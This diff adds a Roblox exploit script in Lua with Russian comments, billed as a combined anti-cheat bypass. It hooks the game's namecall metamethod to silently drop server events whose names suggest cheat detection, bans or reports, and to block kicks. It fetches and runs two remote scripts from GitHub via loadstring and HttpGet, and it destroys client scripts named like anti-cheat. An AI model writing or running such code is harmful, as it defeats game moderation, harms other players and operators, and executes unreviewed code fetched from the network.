@@ -1,0 +1,63 @@
+--[[ 
+    ULTIMATE OPTIMIZED BYPASS (V5)
+    Объединение ACR, Nextix и ручной защиты без лагов.
+]]
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- 1. ЕДИНЫЙ СПИСОК БЛОКИРОВКИ (Оптимизация памяти)
+local blacklist = {
+    "cheat", "detect", "kick", "ban", "check", 
+    "walkspeed", "jumppower", "velocity", "teleport",
+    "fly", "noclip", "anticheat", "ac", "report"
+}
+
+-- 2. БЫСТРЫЙ ХУК (Один для всего)
+local nc
+nc = hookmetamethod(game, "__namecall", function(self, ...)
+    local method = getnamecallmethod()
+    local name = tostring(self):lower()
+
+    if method == "FireServer" then
+        for _, word in ipairs(blacklist) do
+            if name:find(word) then return nil end
+        end
+    elseif method == "Kick" or method == "kick" then
+        warn("🛡 Блокирован кик!")
+        return nil
+    end
+
+    return nc(self, ...)
+end)
+
+-- 3. ФОНОВАЯ ЗАГРУЗКА ВНЕШНИХ МОДУЛЕЙ (Чтобы игра не зависла)
+task.spawn(function()
+    -- Твой новый ACR
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/ACR/refs/heads/main/Acr", true))()
+    end)
+    
+    task.wait(1) -- Пауза между загрузками для стабильности
+    
+    -- Nextix Bypass
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Next1x/Nextix./main/UniversalACBypass"))()
+    end)
+end)
+
+-- 4. ОПТИМИЗИРОВАННЫЙ ДЕСТРУКТОР СКРИПТОВ
+task.spawn(function()
+    local function clean(obj)
+        if obj:IsA("LocalScript") and not checkcaller() then
+            local n = obj.Name:lower()
+            if n:find("ac") or n:find("anti") or n:find("detect") then
+                obj:Destroy()
+            end
+        end
+    end
+    
+    game.DescendantAdded:Connect(clean)
+end)
+
+warn("✅ Все обходы (ACR + Nextix) успешно запущены без лагов!")
